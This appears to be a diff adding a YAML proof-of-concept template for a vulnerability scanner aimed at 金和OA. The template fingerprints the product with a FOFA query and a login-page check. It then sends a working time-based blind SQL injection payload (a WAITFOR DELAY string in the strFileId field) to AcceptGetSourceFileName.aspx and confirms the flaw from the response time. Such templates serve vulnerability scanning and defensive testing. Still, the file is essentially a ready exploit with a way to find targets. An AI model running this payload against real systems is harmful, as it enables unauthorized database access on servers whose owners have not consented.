@@ -1,0 +1,30 @@
+id: poc-yaml-jinher-acceptgetsourcefilename-sqli
+info:
+  name: 金和OA AcceptGetSourceFileName.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
+  expression: status_code == 200 && contains(body,"JHSoft")
+- method: POST
+  path: /c6/Jhsoft.Web.AcceptAip/AcceptGetSourceFileName.aspx/
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: strFileId=-1'WAITFOR DELAY '0:0:{{.t1}}'--&strAppFlag=-1
+  expression: 'status_code == 200 &&
+
+    body == "" &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
